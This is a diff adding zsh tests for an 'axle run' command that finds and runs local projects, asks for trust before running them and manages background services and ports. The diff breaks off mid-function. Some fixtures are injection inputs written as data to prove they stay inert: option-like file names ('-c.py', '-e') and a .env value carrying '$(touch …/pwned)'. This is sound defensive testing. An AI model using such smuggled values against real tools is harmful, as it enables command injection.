@@ -1,0 +1,2040 @@
+# axle run: which project, its root, and why.
+
+# A history log line: hist <seconds ago> <dir>
+hist() {
+  mkdir -p $HOME/.local/share/axle
+  print -r -- "$(( EPOCHSECONDS - $1 ))"$'\t0\t0.10\t'"$2"$'\t\tls' >> $HOME/.local/share/axle/history
+}
+
+# Two projects under ~/repos: shop-api (Python, with a venv) and cli (git).
+projects() {
+  mkdir -p $HOME/repos/shop-api/{.venv,app} $HOME/repos/cli/src
+  : > $HOME/repos/shop-api/pyproject.toml; : > $HOME/repos/shop-api/.venv/pyvenv.cfg
+  mkrepo $HOME/repos/cli >/dev/null
+  hist 7200 $HOME/repos/shop-api/app
+  hist 60   $HOME/repos/cli/src
+  hist 30   $HOME
+}
+
+test_run_lazy_and_off_by_default() {
+  (
+    AXLE_MODULES=(run) load_tool
+    [[ $functions[_axle_project_root] == *_axle_lazy_load* ]] || fail "the project helpers load when first used"
+  ) || exit 1
+  load_tool
+  (( ${AXLE_MODULES[(Ie)run]} )) && fail "run is off by default on this branch"
+  (( ${+_axle_cmd_fn[run]} )) && fail "not registered unless switched on"
+  AXLE_MODULES=(run) load_tool
+  assert_eq "${_axle_cmd_fn[run]}" _axle_cmd_run "registered"
+  [[ $functions[_axle_cmd_run] == *_axle_lazy_load* ]] || fail "its code isn't loaded at startup"
+}
+
+test_run_project_root() {
+  AXLE_MODULES=(run) load_tool
+  projects
+  local -a reply
+  _axle_project_root $HOME/repos/shop-api/app
+  assert_eq "$reply" "$HOME/repos/shop-api pyproject.toml" "nearest marker up the tree"
+  _axle_project_root $HOME/repos/cli/src
+  assert_eq "$reply" "$HOME/repos/cli .git" ".git"
+  : > $HOME/package.json
+  _axle_project_root $HOME && fail "~ itself is never a project"
+  mkdir -p $T/plain; _axle_project_root $T/plain && fail "a plain folder isn't one"
+  return 0
+}
+
+test_run_dry_run_why() {
+  AXLE_MODULES=(run) load_tool
+  projects
+  local out
+  cd $HOME/repos/shop-api/app
+  out=$(axle run --dry-run 2>&1)
+  assert_contains "$out" "root   ~/repos/shop-api" "here: its root"
+  assert_contains "$out" "you're in it · marked by pyproject.toml" "here: why"
+  assert_contains "$out" "venv   .venv" "its venv"
+  cd $HOME
+  out=$(axle run --dry-run 2>&1)
+  assert_contains "$out" "root   ~/repos/cli" "elsewhere: the last project"
+  assert_contains "$out" "the last project you worked in (1m ago)" "elsewhere: why"
+  cd $HOME/repos/cli/src
+  out=$(axle run -n 2>&1)
+  assert_contains "$out" "you're in it" "in cli: cli"
+  out=$(axle run shop -n 2>&1)
+  assert_contains "$out" "root   ~/repos/shop-api" "words: j's pick"
+  assert_contains "$out" 'the best match for "shop"' "words: why"
+  out=$(axle run re cl -n 2>&1)
+  assert_contains "$out" "root   ~/repos/cli" "several words: path, then the project's name"
+  out=$(axle run app -n 2>&1)
+  assert_contains "$out" "root   ~/repos/shop-api" "a subfolder's name: j's pick, then its project"
+  out=$(axle run $HOME/repos/cli -n 2>&1)
+  assert_contains "$out" "the folder you gave" "a path"
+}
+
+test_run_last_skips_current() {
+  AXLE_MODULES=(run) load_tool
+  projects
+  local REPLY
+  cd $HOME/repos/cli/src
+  _axle_run_last; assert_eq "$REPLY" "$HOME/repos/shop-api" "not the one you're in"
+  cd $HOME
+  _axle_run_last; assert_eq "$REPLY" "$HOME/repos/cli" "the most recent"
+  rm -rf $HOME/repos/cli
+  _axle_run_last; assert_eq "$REPLY" "$HOME/repos/shop-api" "a project that's gone is skipped"
+}
+
+test_run_nothing_to_run() {
+  AXLE_MODULES=(run) load_tool
+  local out
+  cd $HOME
+  out=$(axle run -n 2>&1) && fail "no project, no history: an error"
+  assert_contains "$out" "none in your history yet"
+  out=$(axle run nomatch -n 2>&1) && fail "no match: an error"
+  assert_contains "$out" "no project matches 'nomatch'"
+  out=$(axle run --bogus 2>&1) && fail "unknown option"
+  return 0
+}
+
+test_run_state_layout() {
+  AXLE_MODULES=(run) load_tool
+  _axle_run_state_init
+  local d=$HOME/.local/state/axle/run
+  [[ -d $d/services && -d $d/projects && -f $d/trust ]] || fail "services/, projects/, trust"
+  local REPLY a
+  _axle_run_hash /some/root; a=$REPLY
+  _axle_run_hash /some/root; assert_eq "$REPLY" "$a" "the hash is stable"
+  _axle_run_hash /other/root; [[ $REPLY != $a ]] || fail "and differs per root"
+}
+
+test_shared_helpers_without_theme() {
+  load_tool
+  mkdir -p $T/p/deep/.venv; : > $T/p/package.json; : > $T/p/deep/.venv/pyvenv.cfg
+  cd $T/p/deep
+  _axle_scan_markers
+  assert_eq "${_axle_markers[package.json]}" "$T/p" "markers work without Benzene"
+  assert_eq "${_axle_markers[venv]}" "$T/p/deep/.venv" "and find the venv"
+  local REPLY; _axle_venv_find $T/p/deep
+  assert_eq "$REPLY" "$T/p/deep/.venv" "_axle_venv_find"
+}
+
+# --- M1: find and run ---------------------------------------------------------------
+
+# The sample projects, copied out of the repository (else its .git would be their root).
+fixtures() {
+  mkdir -p $T/fx && cp -R $ROOT/tests/fixtures/run/. $T/fx/
+}
+
+# What detection says for a sample: "command | kind | port | what"
+detect() {
+  local REPLY
+  _axle_run_detect $T/fx/$1 || { REPLY='none'; print -r -- none; return }
+  _axle_run_show $T/fx/$1
+  print -r -- "$REPLY | $_axle_run_kind | $_axle_run_port | $_axle_run_what"
+}
+
+test_run_detects_each_sample() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local py=python; whence -p python3 >/dev/null && py=python3
+  local -a cases=(
+    "fastapi|$py -m uvicorn main:api --reload | service | 8000 | python · FastAPI"
+    "flask|$py -m flask --app app.py run --debug | service | 5000 | python · Flask"
+    "flask-main|$py app.py | service | 5000 | python · Flask"
+    "django|$py manage.py runserver | service | 8000 | python · Django"
+    "streamlit|$py -m streamlit run streamlit_app.py | service | 8501 | python · Streamlit"
+    "py-script|tool | task |  | python"
+    "py-entry|$py main.py | task |  | python"
+    "vite|pnpm run dev | service | 5173 | node · Vite (pnpm)"
+    "next|npm run dev | service | 3100 | node · Next.js (npm)"
+    "node-cli|npm run start | task |  | node (npm)"
+    "express|node server.js | service | 4000 | node · express"
+    "axum|cargo run | service | 3300 | rust · axum"
+    "rust-cli|cargo run | task |  | rust"
+    "gin|go run . | service | 9090 | go · gin"
+    "go-http|go run . | service | 8081 | go · net/http"
+    "go-cli|go run . | task |  | go"
+    "static|$py -I -m http.server 8000 | service | 8000 | static site"
+    "nothing|none"
+  )
+  local c
+  for c in $cases; do
+    assert_eq "$(detect ${c%%|*})" "${c#*|}" "sample ${c%%|*}"
+  done
+}
+
+test_run_never_turns_a_file_name_into_an_option() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/odd; : > $T/odd/requirements.txt
+  print 'import gradio' > $T/odd/-c.py
+  print '{"main": "-e", "dependencies": {}}' > $T/odd/package.json; : > $T/odd/-e
+  local REPLY
+  _axle_run_detect $T/odd && fail "nothing safe to run: ${_axle_run_cmd}"
+  return 0
+}
+
+test_run_uses_the_venv() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  mkdir -p $T/fx/fastapi/.venv/bin; : > $T/fx/fastapi/.venv/pyvenv.cfg
+  print '#!/bin/sh' > $T/fx/fastapi/.venv/bin/python; chmod +x $T/fx/fastapi/.venv/bin/python
+  assert_eq "$(detect fastapi)" ".venv/bin/python -m uvicorn main:api --reload | service | 8000 | python · FastAPI" "the venv's python"
+}
+
+test_run_asks_first_then_remembers() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  whence -p python3 >/dev/null || whence -p python >/dev/null || return 0
+  cd $T/fx/py-entry
+  local out
+  out=$(axle run </dev/null 2>&1) && fail "not approved, no terminal to ask in: it doesn't run"
+  assert_contains "$out" "hasn't been approved yet: run it once in a terminal, or pass --yes"
+  [[ $out == *"hello from py-entry"* ]] && fail "nothing ran"
+  out=$(axle run --dry-run 2>&1)
+  assert_contains "$out" "trust  not run before"
+  out=$(axle run --yes </dev/null 2>&1) || fail "--yes runs it: $out"
+  assert_contains "$out" "hello from py-entry" "it ran, in the foreground"
+  assert_contains "$out" "▶ python" "showing the command first"
+  out=$(axle run </dev/null 2>&1) || fail "approved once: runs without asking: $out"
+  assert_contains "$out" "hello from py-entry"
+  # A changed command asks again.
+  print '{"scripts": {"start": "node x.js"}}' > package.json
+  out=$(axle run </dev/null 2>&1) && fail "a different command asks again"
+  return 0
+}
+
+test_run_changed_script_asks_again() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local REPLY a
+  _axle_run_detect $T/fx/node-cli; _axle_run_trust_key $T/fx/node-cli; a=$REPLY
+  sed -E 's/bin\/cli.js/bin\/evil.js/' $T/fx/node-cli/package.json > $T/p.json && mv $T/p.json $T/fx/node-cli/package.json
+  _axle_run_detect $T/fx/node-cli; _axle_run_trust_key $T/fx/node-cli
+  [[ $REPLY != $a ]] || fail "same command (npm run start), different script: a different key"
+}
+
+test_run_from_home_returns_to_last_project() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  hist 60 $T/fx/py-entry
+  cd $HOME
+  local out
+  out=$(axle run </dev/null 2>&1; print "pwd=$PWD")
+  local REPLY; nocolor "$out"; out=$REPLY
+  assert_contains "$out" "↩ py-entry (last worked on 1m ago)" "says where it goes"
+  assert_contains "$out" "pwd=$T/fx/py-entry" "and goes there"
+  out=$(axle run --dry-run 2>&1)
+  assert_contains "$out" "run    "
+}
+
+test_run_no_to_last_project_stays_put() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  hist 60 $T/fx/py-entry
+  cd $HOME
+  axle_confirm() { return 1 }                     # answering no
+  axle_select() { return 1 }                      # (and to "Run another project?")
+  local out
+  out=$(axle run </dev/null 2>&1; print "pwd=$PWD")
+  assert_contains "$out" "pwd=$HOME" "no: you stay where you were"
+  mkdir -p $T/empty && cd $T/empty
+  out=$(axle run </dev/null 2>&1)
+  local REPLY; nocolor "$out"; out=$REPLY
+  assert_contains "$out" "Nothing to run in $T/empty (it's empty)." "says why it goes elsewhere"
+  print x > $T/empty/notes.txt
+  out=$(axle run </dev/null 2>&1); nocolor "$out"; out=$REPLY
+  assert_contains "$out" "(no project files)."
+  cd $HOME
+  out=$(axle run </dev/null 2>&1)
+  [[ $out == *Nothing\ to\ run* ]] && fail "not from ~: $out"
+  return 0
+}
+
+# No to the last project lists the others you worked in lately; one picked runs. Esc
+# (or Ctrl-C) at the question is just a cancel: no list.
+test_run_no_offers_other_recent_projects() {
+  AXLE_MODULES=(run) load_tool
+  local p
+  for p in older newer; do
+    mkdir -p $T/$p; print '[project]' > $T/$p/pyproject.toml
+    print "print('hello from $p')" > $T/$p/main.py
+  done
+  mkdir -p $T/gone; hist 300 $T/gone; rmdir $T/gone  # (gone: not offered)
+  hist 200 $T/older; hist 100 $T/newer
+  cd $HOME
+  fake_terminal; axle_confirm() { [[ $1 == Run\ newer* ]] && return 1; return 0 }
+  axle_select() { print -r -- "OFFERED $1 ${(j:|:)@[3,-1]}"; REPLY=1 }
+  local out REPLY
+  out=$(axle run --fg </dev/null 2>&1; print "pwd=$PWD"); nocolor "$out"; out=$REPLY
+  assert_contains "$out" "OFFERED Run another project?" "a list after no"
+  assert_match "$out" "*|older  * · 3m ago:1|None, stay here:0*" "the others, with when"
+  local offered=${(M)${(f)out}:#OFFERED*}
+  [[ $offered == *newer* ]] && fail "not the one just declined: $offered"
+  [[ $offered == *gone* ]] && fail "not a folder that's gone: $offered"
+  assert_contains "$out" "hello from older" "the one picked runs"
+  assert_contains "$out" "pwd=$T/older" "from its folder"
+  axle_confirm() { return 2 }                     # Esc
+  out=$(axle run --fg </dev/null 2>&1)
+  [[ $out == *OFFERED* ]] && fail "Esc offers nothing: $out"
+  return 0
+}
+
+test_run_missing_program_said_before_asking() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  fake_terminal; axle_confirm() { print -r -- "ASKED $1"; return 0 }
+  path=(${path:#*/node*})
+  if whence -p pnpm >/dev/null; then return 0; fi   # (pnpm installed here: nothing to check)
+  local out
+  out=$(cd $T/fx/vite && axle run --fg 2>&1); local st=$?
+  (( st )) || fail "it doesn't run: $out"
+  local REPLY; nocolor "$out"; out=$REPLY
+  assert_contains "$out" "vite runs with pnpm, which isn't installed: "
+  [[ $out == *"command not found"* ]] && fail "not a raw shell error: $out"
+  [[ $out == *ASKED* ]] && fail "said before asking to trust it: $out"
+  return 0
+}
+
+test_run_static_folder_without_marker() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local out
+  out=$(axle run -n $T/fx/static 2>&1) || fail "a lone index.html is runnable: $out"
+  assert_contains "$out" "kind   service on http://localhost:8000"
+  cd $T/fx/static
+  out=$(axle run -n 2>&1)
+  assert_contains "$out" "you're in it"
+  out=$(axle run -n $T/fx/nothing 2>&1) && fail "a folder with nothing to run isn't a project: $out"
+  return 0
+}
+
+# The real question in a terminal: n runs nothing and remembers nothing; y runs it once
+# and remembers; the next time it just runs.
+test_run_question_in_a_terminal() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  print -r -- "open('$T/ran', 'a').write('x')" > $T/fx/py-entry/main.py
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 AXLE_MODULES=run zsh -f -i"
+  zpty -w sh "PS1='> '; AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh; cd $T/fx/py-entry; : > $T/ready"
+  _wait() { local -i i; local c; for i in {1..100}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $1 ]] && return 0; sleep 0.1; done; fail "no answer ($1)" }
+  _wait $T/ready
+  zpty -w sh "axle run; : > $T/done1"; sleep 0.5; zpty -n -w sh n; _wait $T/done1
+  [[ -e $T/ran ]] && fail "answered n: nothing ran"
+  [[ -s $HOME/.local/state/axle/run/trust ]] && fail "and nothing is remembered"
+  zpty -w sh "axle run; : > $T/done2"; sleep 0.5; zpty -n -w sh y; _wait $T/done2
+  assert_eq "$(<$T/ran)" x "answered y: it ran once"
+  zpty -w sh "axle run; : > $T/done3"; _wait $T/done3
+  assert_eq "$(<$T/ran)" xx "the next time, no question"
+  zpty -w sh 'exit'; zpty -d sh 2>/dev/null
+  return 0
+}
+
+# --- M2: background services ----------------------------------------------------------
+
+# Whatever a service test started is stopped when its shell exits, even after a failure.
+# Only in the test's own process: zpty forks it to start a terminal's shell, and that
+# copy exiting must not stop anything.
+zmodload zsh/system
+typeset -g _test_pid=$sysparams[pid]
+_stop_services() {
+  (( sysparams[pid] == _test_pid )) || return 0
+  [[ -n $TMUX_TMPDIR ]] && whence -p tmux >/dev/null && command tmux kill-server 2>/dev/null
+  local d p
+  for d in $HOME/.local/state/axle/run/services/*(N/); do
+    for p in $d/(watcher|pid)(N); do [[ $(<$p) == $$ ]] || kill -TERM $(<$p) 2>/dev/null; done
+  done
+}
+zshexit_functions+=(_stop_services)
+
+# A free-ish port for this test run.
+free_port() { REPLY=$(( 20000 + ($$ * 7 + RANDOM) % 20000 )) }
+
+# Wait (up to 20 s: a cold CI machine starts Python slowly) until a service's state file
+# says <state>. On failure, everything needed to see why.
+wait_state() {
+  local -i i; local s='' d=$HOME/.local/state/axle/run/services/$1
+  for i in {1..200}; do
+    [[ -r $d/state ]] && s=$(<$d/state)
+    [[ $s == $2 ]] && return 0
+    sleep 0.1
+  done
+  # The annotation CI shows is cut at 1500 characters: what matters most goes first.
+  local w='' p='' tr=''
+  [[ -r $d/watcher ]] && w=$(<$d/watcher); [[ -r $d/pid ]] && p=$(<$d/pid)
+  [[ -r $d/trace ]] && tr=$(tail -14 $d/trace | sed -E 's|/[^ ]*/(services\|work)/|…/|g' | cut -c1-80)
+  fail "$1 never became $2 (last: ${s:-none})
+service: $(lsof -nP -a -p ${p:-1} -iTCP 2>/dev/null | tail -n +2 | awk '{print $8, $9, $10}' | tr '\n' ';') stack: $(command -v sample >/dev/null && sample ${p:-1} 1 -mayDie 2>/dev/null | grep -oE 'getaddrinfo|getnameinfo|gethostby[a-z_]*|getfqdn|poll|select|accept|__recvfrom' | sort -u | tr '\n' ' ')
+children of the supervisor: $(ps -A -o ppid=,pid=,stat=,etime=,comm= | awk -v w="${w:-1}" '$1 == w { print $2, $3, $4, $5 }' | sed 's|/[^ ]*/||' | tr '\n' ';')
+trace end:
+$tr
+log: $(tail -3 $d/log 2>/dev/null | cut -c1-80)"
+}
+
+# A small web project serving on a port of our choosing (tests/serve.py).
+# Questions answered by a test's own axle_confirm / axle_select, as in a terminal (without
+# one, axle run doesn't ask: an unapproved command just doesn't run).
+fake_terminal() { _axle_ui_tty </dev/null; _axle_ui_tty() { return 0 } }
+
+web_project() {
+  mkdir -p $T/web; print '<!doctype html>' > $T/web/index.html; : > $T/web/requirements.txt
+  local py; py=$(whence -p python3 || whence -p python) || return 1
+  typeset -ga _axle_run_cmd=($py $ROOT/tests/serve.py $1)
+  typeset -g _axle_run_kind=service _axle_run_port=$1
+}
+
+test_run_service_lifecycle() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  web_project $port || return 0
+  local dir=$HOME/.local/state/axle/run/services/web drop=$HOME/.cache/axle/drops/run-web
+  _axle_run_start $T/web web
+  wait_state web up
+  local pid=$(<$dir/pid)
+  kill -0 $pid || fail "the service runs"
+  assert_contains "$(<$drop)" "icon=⚡" "a ⚡ drop"
+  assert_contains "$(<$drop)" "text=web :$port" "with its port"
+  assert_contains "$(<$drop)" $'\nlink=http://localhost:'$port "and a link"
+  assert_contains "$(<$drop)" $'\npid='"$pid"$'\n' "and the pid it lives with (the service's)"
+  local out
+  out=$(cd $T/web && axle run ls)
+  assert_match "$out" "*web*up*$port*http://localhost:$port*" "ls shows it"
+  # In the prompt, with Benzene.
+  load_theme
+  _axle_seg_drops; plain "$REPLY"
+  assert_contains "$REPLY" "⚡ web :$port" "the tab in the prompt"
+  cd $T/web
+  out=$(axle run stop)
+  assert_contains "$out" "stopped web"
+  sleep 0.2
+  kill -0 $pid 2>/dev/null && fail "the process is gone"
+  [[ -e $dir || -e $drop ]] && fail "nothing left behind"
+  return 0
+}
+
+# Killed by hand from a process list, as `kill <pid>` would: the supervisor (its command
+# line is the one with the project's name) stops the service; the service itself just
+# stops (no red tab); a supervisor killed outright leaves the tab while the service runs.
+test_run_killed_by_hand() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  web_project $port || return 0
+  local dir=$HOME/.local/state/axle/run/services/web drop=$HOME/.cache/axle/drops/run-web pid
+  _axle_run_start $T/web web; wait_state web up
+  pid=$(<$dir/pid)
+  kill -TERM $(<$dir/watcher)
+  local -i i
+  for i in {1..60}; do [[ -e $dir || -e $drop ]] || break; sleep 0.1; done
+  kill -0 $pid 2>/dev/null && fail "TERM to the supervisor stops the service"
+  [[ -e $dir || -e $drop ]] && fail "and leaves nothing behind"
+
+  _axle_run_start $T/web web; wait_state web up
+  pid=$(<$dir/pid)
+  kill -TERM $pid
+  for i in {1..60}; do [[ -e $dir ]] || break; sleep 0.1; done
+  [[ -e $drop ]] && fail "a service stopped with TERM gets no red tab: $(<$drop)"
+
+  _axle_run_start $T/web web; wait_state web up
+  pid=$(<$dir/pid)
+  kill -KILL $(<$dir/watcher); sleep 0.3
+  kill -0 $pid 2>/dev/null || fail "(the service outlives a killed supervisor)"
+  load_theme
+  _axle_seg_drops; plain "$REPLY"
+  assert_contains "$REPLY" "⚡ web :$port" "its tab stays while it runs"
+  assert_match "$(axle run ls)" "*web*up*$port*" "ls still lists it"
+  axle run stop web >/dev/null; sleep 0.2
+  kill -0 $pid 2>/dev/null && fail "and stop still ends it"
+  return 0
+}
+
+test_run_crash_turns_red() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/bad; : > $T/bad/requirements.txt
+  typeset -ga _axle_run_cmd=(sh -c 'echo "Traceback: boom" >&2; exit 3')
+  typeset -g _axle_run_kind=service _axle_run_port=''
+  _axle_run_start $T/bad bad
+  wait_state bad crashed
+  local drop=$HOME/.cache/axle/drops/run-bad
+  assert_contains "$(<$drop)" "level=alarm" "a red tab"
+  assert_contains "$(<$drop)" "exited (3)" "with the exit code"
+  assert_contains "$(<$drop)" "icon=✘" "and not the ⚡ of a running one"
+  local out
+  out=$(axle run ls)
+  assert_match "$out" "*bad*exit 3*" "ls shows the crash"
+  out=$(axle run logs bad)
+  assert_contains "$out" "Traceback: boom" "logs show its output"
+  [[ -e $drop ]] && fail "looking at the logs clears the red tab"
+  axle run stop bad >/dev/null
+  [[ -e $HOME/.local/state/axle/run/services/bad ]] && fail "stop clears a crashed one"
+  return 0
+}
+
+test_run_stop_all_leaves_nothing() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY p1 p2; free_port; p1=$REPLY; p2=$(( p1 + 1 ))
+  web_project $p1 || return 0
+  _axle_run_start $T/web one
+  web_project $p2
+  _axle_run_start $T/web two
+  wait_state one up; wait_state two up
+  local -a pids=($(<$HOME/.local/state/axle/run/services/one/pid) $(<$HOME/.local/state/axle/run/services/two/pid)
+                 $(<$HOME/.local/state/axle/run/services/one/watcher) $(<$HOME/.local/state/axle/run/services/two/watcher))
+  local out=$(axle run stop all)
+  assert_contains "$out" "stopped one"
+  assert_contains "$out" "stopped two"
+  sleep 0.3
+  local p
+  for p in $pids; do kill -0 $p 2>/dev/null && fail "process $p still running"; done
+  local -a left=($HOME/.local/state/axle/run/services/*(N) $HOME/.cache/axle/drops/run-*(N))
+  (( ${#left} )) && fail "files left behind: $left"
+  assert_eq "$(axle run ls)" "nothing running"
+}
+
+test_run_restart_and_env_file() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/envp; : > $T/envp/requirements.txt
+  print -l '# settings' 'export GREETING="hello there"' 'TOKEN=abc # comment' 'BAD LINE' 'EVIL=$(touch '$T'/pwned)' > $T/envp/.env
+  local -a reply
+  _axle_run_envfile $T/envp/.env
+  assert_eq "${(j:|:)reply}" "GREETING=hello there|TOKEN=abc|EVIL=\$(touch $T/pwned)" ".env read as data"
+  typeset -ga _axle_run_cmd=(sh -c 'echo "$GREETING/$TOKEN/$EVIL" > out.txt; exec sleep 30')
+  typeset -g _axle_run_kind=service _axle_run_port=''
+  _axle_run_start $T/envp envp
+  local -i i; for i in {1..50}; do [[ -s $T/envp/out.txt ]] && break; sleep 0.1; done
+  assert_eq "$(<$T/envp/out.txt)" "hello there/abc/\$(touch $T/pwned)" "the values reach the service, as text"
+  [[ -e $T/pwned ]] && fail "nothing in .env runs"
+  local pid1=$(<$HOME/.local/state/axle/run/services/envp/pid)
+  rm $T/envp/out.txt
+  axle run restart envp >/dev/null
+  for i in {1..50}; do [[ -s $T/envp/out.txt ]] && break; sleep 0.1; done
+  local pid2=$(<$HOME/.local/state/axle/run/services/envp/pid)
+  [[ $pid1 != $pid2 ]] || fail "restart starts a new process"
+  assert_eq "$(<$T/envp/out.txt)" "hello there/abc/\$(touch $T/pwned)" "the same command, with all its words, and .env"
+  kill -0 $pid1 2>/dev/null && fail "and stops the old one"
+  axle run stop all >/dev/null
+  return 0
+}
+
+test_run_pid_reuse_is_not_ours() {
+  AXLE_MODULES=(run) load_tool
+  local dir=$HOME/.local/state/axle/run/services/ghost
+  mkdir -p $dir
+  print $$ > $dir/pid; print 'not-the-start-time' > $dir/pstart; print crashed-not > $dir/state
+  _axle_run_alive $dir && fail "a live pid with another start time isn't our service"
+  local -a reply; _axle_run_services
+  (( ${reply[(Ie)ghost]} )) && fail "and a dead service is cleaned up"
+  return 0
+}
+
+# From a real terminal: `axle run --bg` starts it, the port comes from what it prints,
+# and closing the terminal leaves it running (decided); `stop` ends it.
+test_run_service_survives_closing_the_terminal() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/srv
+  print -l "import http.server, socketserver" \
+    "s = socketserver.TCPServer(('127.0.0.1', $port), http.server.SimpleHTTPRequestHandler)" \
+    "print('Serving at http://localhost:$port/', flush=True)" "s.serve_forever()" > $T/srv/main.py
+  : > $T/srv/requirements.txt
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 zsh -f -i"
+  zpty -w sh "PS1='> '; AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh; cd $T/srv; axle run --yes --bg; : > $T/started"
+  local -i i; local c
+  for i in {1..150}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $T/started ]] && break; sleep 0.1; done
+  [[ -e $T/started ]] || fail "axle run --bg didn't return"
+  wait_state srv up
+  local dir=$HOME/.local/state/axle/run/services/srv pid
+  pid=$(<$dir/pid)
+  assert_eq "$(<$dir/port)" $port "the port it printed"
+  zpty -d sh 2>/dev/null                         # close the terminal
+  sleep 1
+  kill -0 $pid 2>/dev/null || fail "the service keeps running after the terminal closes"
+  _axle_run_port_up $port || fail "and still answers"
+  cd $T/srv; axle run stop >/dev/null
+  sleep 0.2
+  kill -0 $pid 2>/dev/null && fail "stop ends it"
+  return 0
+}
+
+# --- M3: ports ------------------------------------------------------------------------
+
+test_run_port_ways() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local REPLY c
+  local -a cases=(
+    "fastapi|--port 9001|python3 -m uvicorn main:api --reload --port 9001"
+    "flask|--port|python3 -m flask --app app.py run --debug --port 9001"
+    "django|9001|python3 manage.py runserver 9001"
+    "streamlit|--server.port|python3 -m streamlit run streamlit_app.py --server.port 9001"
+    "vite|pnpm: --port|pnpm run dev --port 9001"
+    "static|last word|python3 -I -m http.server 9001"
+  )
+  local py=python; whence -p python3 >/dev/null && py=python3
+  for c in $cases; do
+    local name=${c%%|*} want=${${c##*|}//python3/$py}
+    _axle_run_detect $T/fx/$name
+    _axle_run_apply_port 9001 || fail "$name: the port can be changed"
+    _axle_run_show $T/fx/$name
+    assert_eq "$REPLY" "$want" "$name: ${${c#*|}%%|*}"
+    assert_eq "$_axle_run_port" 9001 "$name: the port is remembered"
+  done
+  # npm needs `--` before a script's own options; express takes PORT.
+  print '{"scripts": {"dev": "vite"}}' > $T/fx/vite/package.json; rm $T/fx/vite/pnpm-lock.yaml
+  _axle_run_detect $T/fx/vite; _axle_run_apply_port 9002; _axle_run_show $T/fx/vite
+  assert_eq "$REPLY" "npm run dev -- --port 9002" "npm: -- --port"
+  _axle_run_detect $T/fx/express; _axle_run_apply_port 9003
+  assert_eq "$_axle_run_env" "PORT=9003" "express: PORT"
+  # A script with its own port, or a Rust server that doesn't read PORT: can't be changed.
+  _axle_run_detect $T/fx/next; _axle_run_apply_port 9004 && fail "next -p 3100 sets its own port"
+  _axle_run_detect $T/fx/axum; _axle_run_apply_port 9004 && fail "this axum app has a fixed port"
+  return 0
+}
+
+test_run_port_from_env_and_vite_config() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  print 'PORT=4100' > $T/fx/express/.env
+  _axle_run_detect $T/fx/express; assert_eq "$_axle_run_port" 4100 "PORT in .env (for a program that reads it)"
+  print 'export default { server: { port: 5200 } }' > $T/fx/vite/vite.config.ts
+  _axle_run_detect $T/fx/vite; assert_eq "$_axle_run_port" 5200 "vite.config server.port"
+}
+
+test_run_port_holder() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  [[ -r /proc/net/tcp ]] || whence -p lsof >/dev/null || return 0
+  local REPLY port; free_port; port=$REPLY
+  $py $ROOT/tests/serve.py $port >/dev/null 2>&1 &
+  local pid=$!
+  local -i i; for i in {1..50}; do _axle_run_port_up $port && break; sleep 0.1; done
+  _axle_run_port_holder $port; local got=$REPLY
+  kill $pid 2>/dev/null
+  assert_eq "$got" "$pid" "the process listening on the port"
+  assert_match "$_axle_run_holder" "(#i)*python*" "and its name"
+}
+
+test_run_two_projects_same_port() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  # Two static sites whose default port we pin to the same free one.
+  mkdir -p $T/one $T/two
+  print '<!doctype html>' > $T/one/index.html; print '<!doctype html>' > $T/two/index.html
+  : > $T/one/requirements.txt; : > $T/two/requirements.txt
+  functions[_axle_run_detect_orig]=$functions[_axle_run_detect]
+  _axle_run_detect >/dev/null 2>&1 $T/one   # (load the real one)
+  functions[_axle_run_detect_orig]=$functions[_axle_run_detect]
+  _axle_run_detect() { _axle_run_detect_orig "$@" || return 1; _axle_run_cmd=($_axle_run_cmd[1] $ROOT/tests/serve.py $port); _axle_run_port=$port }
+  local out
+  cd $T/one; out=$(axle run --yes </dev/null 2>&1) || fail "the first runs: $out"
+  wait_state one up
+  cd $T/two; out=$(axle run --yes </dev/null 2>&1) || fail "the second runs: $out"
+  assert_contains "$out" "Port $port is taken by your service one" "says who has it"
+  wait_state two up
+  assert_eq "$(<$HOME/.local/state/axle/run/services/one/port)" $port "the first on the port"
+  assert_eq "$(<$HOME/.local/state/axle/run/services/two/port)" $(( port + 1 )) "the second on the next one"
+  _axle_run_port_up $port && _axle_run_port_up $(( port + 1 )) || fail "both answer"
+  axle run stop all >/dev/null
+}
+
+# A file that starts its own server (app.run(port=...) under __main__) is still given the
+# next free port, without changing it: its run() gets the port (modules/run/py).
+test_run_self_starting_file_on_another_port() {
